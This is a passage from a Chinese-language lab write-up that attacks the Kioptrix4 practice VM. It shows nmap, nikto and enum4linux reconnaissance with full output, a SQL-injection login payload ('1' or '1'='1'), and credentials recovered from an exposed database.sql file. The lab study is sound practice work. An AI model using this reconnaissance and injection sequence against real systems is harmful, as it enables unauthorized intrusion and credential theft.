<span class="token punctuation">[</span>08:41:33<span class="token punctuation">]</span> <span class="token number">301</span> -  350B  - /images  -<span class="token operator">&gt;</span>  http://192.168.1.6/images/           
<span class="token punctuation">[</span>08:41:33<span class="token punctuation">]</span> <span class="token number">200</span> -  930B  - /images/                                          
<span class="token punctuation">[</span>08:41:40<span class="token punctuation">]</span> <span class="token number">302</span> -    0B  - /logout/  -<span class="token operator">&gt;</span>  index.php                           
<span class="token punctuation">[</span>08:41:40<span class="token punctuation">]</span> <span class="token number">302</span> -    0B  - /logout  -<span class="token operator">&gt;</span>  index.php                            
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/  -<span class="token operator">&gt;</span>  index.php                           
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member  -<span class="token operator">&gt;</span>  index.php
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/login  -<span class="token operator">&gt;</span>  index.php
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/admin.asp  -<span class="token operator">&gt;</span>  index.php
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/logon  -<span class="token operator">&gt;</span>  index.php
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/login.rb  -<span class="token operator">&gt;</span>  index.php                   
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/signin  -<span class="token operator">&gt;</span>  index.php                     
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/login.html  -<span class="token operator">&gt;</span>  index.php                 
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member.php  -<span class="token operator">&gt;</span>  index.php                        
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/login.jsp  -<span class="token operator">&gt;</span>  index.php                  
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/login.asp  -<span class="token operator">&gt;</span>  index.php                  
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/login.py  -<span class="token operator">&gt;</span>  index.php
<span class="token punctuation">[</span>08:41:42<span class="token punctuation">]</span> <span class="token number">302</span> -  220B  - /member/login.39772.zip  -<span class="token operator">&gt;</span>  index.php            
                                                                             
Task Completed


</code></pre> 
<blockquote> 
 <p>测试结果显示,获得目录</p> 
</blockquote> 
<h3><a id="25__329"></a>2.5 漏洞切入点</h3> 
<h4><a id="251__330"></a>2.5.1 访问首页</h4> 
<blockquote> 
 <p>访问链接：</p> 
 <ul><li>http://192.168.1.6/<br> <img src="https://images2.imgbox.com/14/e8/V20k0Mo2_o.png" alt="这是一个登录页"><br> payload测试：</li><li>username:<strong>john</strong></li><li>password:<strong>1’ or ‘1’ =’ 1</strong></li></ul> 
</blockquote> 
<h4><a id="252_nmap_339"></a>2.5.2 nmap漏洞扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># nmap -A -v -sS -Pn -T4 --script=vuln 192.168.1.6</span>
Host discovery disabled <span class="token punctuation">(</span>-Pn<span class="token punctuation">)</span>. All addresses will be marked <span class="token string">'up'</span> and scan <span class="token builtin class-name">times</span> may be slower.
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-12 08:47 EDT
NSE: Loaded <span class="token number">150</span> scripts <span class="token keyword">for</span> scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:47
Completed NSE at 08:47, <span class="token number">10</span>.01s elapsed
Initiating NSE at 08:47
Completed NSE at 08:47, <span class="token number">0</span>.00s elapsed
Initiating ARP Ping Scan at 08:47
Scanning <span class="token number">192.168</span>.1.6 <span class="token punctuation">[</span><span class="token number">1</span> port<span class="token punctuation">]</span>
Completed ARP Ping Scan at 08:47, <span class="token number">0</span>.08s elapsed <span class="token punctuation">(</span><span class="token number">1</span> total hosts<span class="token punctuation">)</span>
Initiating Parallel DNS resolution of <span class="token number">1</span> host. at 08:47
Completed Parallel DNS resolution of <span class="token number">1</span> host. at 08:47, <span class="token number">5</span>.24s elapsed
Initiating SYN Stealth Scan at 08:47
Scanning <span class="token number">192.168</span>.1.6 <span class="token punctuation">[</span><span class="token number">1000</span> ports<span class="token punctuation">]</span>
Discovered <span class="token function">open</span> port <span class="token number">22</span>/tcp on <span class="token number">192.168</span>.1.6
Discovered <span class="token function">open</span> port <span class="token number">139</span>/tcp on <span class="token number">192.168</span>.1.6
Discovered <span class="token function">open</span> port <span class="token number">445</span>/tcp on <span class="token number">192.168</span>.1.6
Discovered <span class="token function">open</span> port <span class="token number">80</span>/tcp on <span class="token number">192.168</span>.1.6
Completed SYN Stealth Scan at 08:47, <span class="token number">2</span>.15s elapsed <span class="token punctuation">(</span><span class="token number">1000</span> total ports<span class="token punctuation">)</span>
Initiating Service scan at 08:47
Scanning <span class="token number">4</span> services on <span class="token number">192.168</span>.1.6
Completed Service scan at 08:47, <span class="token number">11</span>.02s elapsed <span class="token punctuation">(</span><span class="token number">4</span> services on <span class="token number">1</span> <span class="token function">host</span><span class="token punctuation">)</span>
Initiating OS detection <span class="token punctuation">(</span>try <span class="token comment">#1) against 192.168.1.6</span>
NSE: Script scanning <span class="token number">192.168</span>.1.6.
Initiating NSE at 08:47
Completed NSE at 08:54, <span class="token number">362</span>.52s elapsed
Initiating NSE at 08:54
Completed NSE at 08:54, <span class="token number">0</span>.09s elapsed
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.6
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0010s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">566</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>, <span class="token number">430</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT    STATE SERVICE     VERSION
<span class="token number">22</span>/tcp  <span class="token function">open</span>  <span class="token function">ssh</span>         OpenSSH <span class="token number">4</span>.7p1 Debian 8ubuntu1.2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token number">80</span>/tcp  <span class="token function">open</span>  http        Apache httpd <span class="token number">2.2</span>.8 <span class="token punctuation">((</span>Ubuntu<span class="token punctuation">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<span class="token punctuation">)</span>
<span class="token operator">|</span> http-enum: 
<span class="token operator">|</span>   /database.sql: Possible database backup
<span class="token operator">|</span>   /icons/: Potentially interesting folder w/ directory listing
<span class="token operator">|</span>   /images/: Potentially interesting directory w/ listing on <span class="token string">'apache/2.2.8 (ubuntu) php/5.2.4-2ubuntu5.6 with suhosin-patch'</span>
<span class="token operator">|</span>_  /index/: Potentially interesting folder
<span class="token operator">|</span>_http-server-header: Apache/2.2.8 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
<span class="token operator">|</span> http-csrf: 
<span class="token operator">|</span> Spidering limited to: <span class="token assign-left variable">maxdepth</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span> <span class="token assign-left variable">maxpagecount</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span> <span class="token assign-left variable">withinhost</span><span class="token operator">=</span><span class="token number">192.168</span>.1.6
<span class="token operator">|</span>   Found the following possible CSRF vulnerabilities: 
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.1.6:80/
<span class="token operator">|</span>     Form id: myusername
<span class="token operator">|</span>     Form action: checklogin.php
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.1.6:80/checklogin.php
<span class="token operator">|</span>     Form id: 
<span class="token operator">|</span>     Form action: index.php
<span class="token operator">|</span>     
<span class="token operator">|</span>     Path: http://192.168.1.6:80/index.php
<span class="token operator">|</span>     Form id: myusername
<span class="token operator">|</span>_    Form action: checklogin.php
<span class="token operator">|</span> http-slowloris-check: 
<span class="token operator">|</span>   VULNERABLE:
<span class="token operator">|</span>   Slowloris DOS attack
<span class="token operator">|</span>     State: LIKELY VULNERABLE
<span class="token operator">|</span>     IDs:  CVE:CVE-2007-6750
<span class="token operator">|</span>       Slowloris tries to keep many connections to the target web server <span class="token function">open</span> and hold
<span class="token operator">|</span>       them <span class="token function">open</span> as long as possible.  It accomplishes this by opening connections to
<span class="token operator">|</span>       the target web server and sending a partial request. By doing so, it starves
<span class="token operator">|</span>       the http server<span class="token string">'s resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn'</span>t <span class="token function">find</span> any DOM based XSS.
<span class="token operator">|</span>_http-stored-xss: Couldn't <span class="token function">find</span> any stored XSS vulnerabilities.
<span class="token operator">|</span>_http-trace: TRACE is enabled
<span class="token number">139</span>/tcp <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp <span class="token function">open</span>  netbios-ssn Samba smbd <span class="token number">3</span>.X - <span class="token number">4</span>.X <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
MAC Address: 00:0C:29:41:10:00 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">2.6</span>.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux <span class="token number">2.6</span>.9 - <span class="token number">2.6</span>.33
Uptime guess: <span class="token number">0.019</span> days <span class="token punctuation">(</span>since Wed Jun <span class="token number">12</span> 08:27:20 <span class="token number">2024</span><span class="token punctuation">)</span>
Network Distance: <span class="token number">1</span> hop
TCP Sequence Prediction: <span class="token assign-left variable">Difficulty</span><span class="token operator">=</span><span class="token number">199</span> <span class="token punctuation">(</span>Good luck<span class="token operator">!</span><span class="token punctuation">)</span>
IP ID Sequence Generation: All zeros
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
<span class="token operator">|</span>_smb-vuln-regsvc-dos: ERROR: Script execution failed <span class="token punctuation">(</span>use <span class="token parameter variable">-d</span> to debug<span class="token punctuation">)</span>
<span class="token operator">|</span>_smb-vuln-ms10-061: <span class="token boolean">false</span>
<span class="token operator">|</span>_smb-vuln-ms10-054: <span class="token boolean">false</span>

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">1.02</span> ms <span class="token number">192.168</span>.1.6

NSE: Script Post-scanning.
Initiating NSE at 08:54
Completed NSE at 08:54, <span class="token number">0</span>.00s elapsed
Initiating NSE at 08:54
Completed NSE at 08:54, <span class="token number">0</span>.00s elapsed
Read data files from: /usr/bin/<span class="token punctuation">..</span>/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">393.04</span> seconds
           Raw packets sent: <span class="token number">1450</span> <span class="token punctuation">(</span><span class="token number">64</span>.546KB<span class="token punctuation">)</span> <span class="token operator">|</span> Rcvd: <span class="token number">1226</span> <span class="token punctuation">(</span><span class="token number">172</span>.149KB<span class="token punctuation">)</span>

</code></pre> 
<h4><a id="253_nikto_452"></a>2.5.3 nikto漏洞扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># nikto -h 192.168.1.6</span>
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          <span class="token number">192.168</span>.1.6
+ Target Hostname:    <span class="token number">192.168</span>.1.6
+ Target Port:        <span class="token number">80</span>
+ Start Time:         <span class="token number">2024</span>-06-12 08:47:42 <span class="token punctuation">(</span>GMT-4<span class="token punctuation">)</span>
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="token keyword">in</span> a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /database.sql: Server may leak inodes via ETags, header found with <span class="token function">file</span> /database.sql, inode: <span class="token number">148370</span>, size: <span class="token number">298</span>, mtime: Sat Feb  <span class="token number">4</span> <span class="token number">11</span>:11:51 <span class="token number">2012</span>. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2003-1418
+ /database.sql: Potentially interesting backup/cert <span class="token function">file</span> found. <span class="token builtin class-name">.</span> See: https://cwe.mitre.org/data/definitions/530.html
+ /index: Uncommon header <span class="token string">'tcn'</span> found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, <span class="token function">which</span> allows attackers to easily brute force <span class="token function">file</span> names. The following alternatives <span class="token keyword">for</span> <span class="token string">'index'</span> were found: index.php. See: http://www.wisec.it/sectou.php?id<span class="token operator">=</span>4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated <span class="token punctuation">(</span>current is at least <span class="token number">8.1</span>.5<span class="token punctuation">)</span>, PHP <span class="token number">7.4</span>.28 <span class="token keyword">for</span> the <span class="token number">7.4</span> branch.
+ Apache/2.2.8 appears to be outdated <span class="token punctuation">(</span>current is at least Apache/2.4.54<span class="token punctuation">)</span>. Apache <span class="token number">2.2</span>.34 is the EOL <span class="token keyword">for</span> the <span class="token number">2</span>.x branch.
+ PHP/5.2 - PHP <span class="token number">3</span>/4/5 and <span class="token number">7.0</span> are End of Life products without support.
+ /: Web Server returns a valid response with junk HTTP methods <span class="token function">which</span> may cause <span class="token boolean">false</span> positives.
+ /: HTTP TRACE method is active <span class="token function">which</span> suggests the <span class="token function">host</span> is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /?<span class="token operator">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?<span class="token operator">=</span>PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?<span class="token operator">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?<span class="token operator">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /database.sql: Database SQL found.
+ /icons/: Directory indexing found.
+ /images/: Directory indexing found.
+ /icons/README: Apache default <span class="token function">file</span> found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /member.php?vwar_root<span class="token operator">=</span>http://blog.cirt.net/rfiinc.txt: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /<span class="token comment">#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>
+ <span class="token number">8908</span> requests: <span class="token number">1</span> error<span class="token punctuation">(</span>s<span class="token punctuation">)</span> and <span class="token number">22</span> item<span class="token punctuation">(</span>s<span class="token punctuation">)</span> reported on remote <span class="token function">host</span>
+ End Time:           <span class="token number">2024</span>-06-12 08:48:41 <span class="token punctuation">(</span>GMT-4<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">59</span> seconds<span class="token punctuation">)</span>
---------------------------------------------------------------------------
+ <span class="token number">1</span> host<span class="token punctuation">(</span>s<span class="token punctuation">)</span> tested


</code></pre> 
<blockquote> 
 <p>/database.sql: Database SQL found.<br> 发现数据库文件<br> 访问数据库文件：</p> 
 <ul><li>http://192.168.1.6/database.sql<br> <img src="https://images2.imgbox.com/93/e3/C5bBj8mv_o.png" alt="在这里插入图片描述"><br> 发现用户：</li><li>用户名:john</li><li>密码：1234<br> 网页发现登录不了。</li></ul> 
</blockquote> 
<h4><a id="254_enum4linux_506"></a>2.5.4 enum4linux漏洞扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># enum4linux 192.168..1.6</span>
Starting enum4linux v0.9.1 <span class="token punctuation">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="token punctuation">)</span> on Wed Jun <span class="token number">12</span> 08:51:13 <span class="token number">2024</span>

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Target Information <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Target <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token number">192.168</span><span class="token punctuation">..</span><span class="token number">1.6</span>
RID Range <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token number">500</span>-550,1000-1050
Username <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Password <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Known Usernames <span class="token punctuation">..</span> administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">(</span> Enumerating Workgroup/Domain on <span class="token number">192.168</span><span class="token punctuation">..</span><span class="token number">1.6</span> <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>


<span class="token punctuation">[</span>E<span class="token punctuation">]</span> Can<span class="token string">'t find workgroup/domain



 ================================( Nbtstat Information for 192.168..1.6 )================================

Looking up status of 0.0.0.0
No reply from 0.0.0.0

 ===================================( Session Check on 192.168..1.6 )===================================


[E] Server doesn'</span>t allow session using username <span class="token string">''</span>, password <span class="token string">''</span><span class="token builtin class-name">.</span>  Aborting remainder of tests.

                                                                                                                                                                                                                
┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># enum4linux 192.168.1.6 </span>
Starting enum4linux v0.9.1 <span class="token punctuation">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="token punctuation">)</span> on Wed Jun <span class="token number">12</span> 08:55:42 <span class="token number">2024</span>

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Target Information <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Target <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token number">192.168</span>.1.6
RID Range <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token number">500</span>-550,1000-1050
Username <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Password <span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>. <span class="token string">''</span>
Known Usernames <span class="token punctuation">..</span> administrator, guest, krbtgt, domain admins, root, bin, none


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">(</span> Enumerating Workgroup/Domain on <span class="token number">192.168</span>.1.6 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>


<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got domain/workgroup name: WORKGROUP


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">(</span> Nbtstat Information <span class="token keyword">for</span> <span class="token number">192.168</span>.1.6 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

Looking up status of <span class="token number">192.168</span>.1.6
	KIOPTRIX4       <span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span> -         B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">&gt;</span>  Workstation Service
	KIOPTRIX4       <span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span> -         B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">&gt;</span>  Messenger Service
	KIOPTRIX4       <span class="token operator">&lt;</span><span class="token number">2</span><span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span> -         B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">&gt;</span>  File Server Service
	<span class="token punctuation">..</span>__MSBROWSE__. <span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span> - <span class="token operator">&lt;</span>GROUP<span class="token operator">&gt;</span> B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">&gt;</span>  Master Browser
	WORKGROUP       <span class="token operator">&lt;</span>1d<span class="token operator">&gt;</span> -         B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">&gt;</span>  Master Browser
	WORKGROUP       <span class="token operator">&lt;</span>1e<span class="token operator">&gt;</span> - <span class="token operator">&lt;</span>GROUP<span class="token operator">&gt;</span> B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">&gt;</span>  Browser Service Elections
	WORKGROUP       <span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span> - <span class="token operator">&lt;</span>GROUP<span class="token operator">&gt;</span> B <span class="token operator">&lt;</span>ACTIVE<span class="token operator">&gt;</span>  Domain/Workgroup Name

	MAC Address <span class="token operator">=</span> 00-00-00-00-00-00

 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">(</span> Session Check on <span class="token number">192.168</span>.1.6 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>


<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Server <span class="token number">192.168</span>.1.6 allows sessions using username <span class="token string">''</span>, password <span class="token string">''</span>


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token punctuation">(</span> Getting domain SID <span class="token keyword">for</span> <span class="token number">192.168</span>.1.6 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

Domain Name: WORKGROUP
Domain Sid: <span class="token punctuation">(</span>NULL SID<span class="token punctuation">)</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Can<span class="token string">'t determine if host is part of domain or part of a workgroup


 ===================================( OS information on 192.168.1.6 )===================================


[E] Can'</span>t get OS info with smbclient


<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got OS info <span class="token keyword">for</span> <span class="token number">192.168</span>.1.6 from srvinfo: 
	KIOPTRIX4      Wk Sv PrQ Unx NT SNT Kioptrix4 server <span class="token punctuation">(</span>Samba, Ubuntu<span class="token punctuation">)</span>
	platform_id     <span class="token builtin class-name">:</span>	<span class="token number">500</span>
	os version      <span class="token builtin class-name">:</span>	<span class="token number">4.9</span>
	server <span class="token builtin class-name">type</span>     <span class="token builtin class-name">:</span>	0x809a03


 <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token punctuation">(</span> Users on <span class="token number">192.168</span>.1.6 <span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span 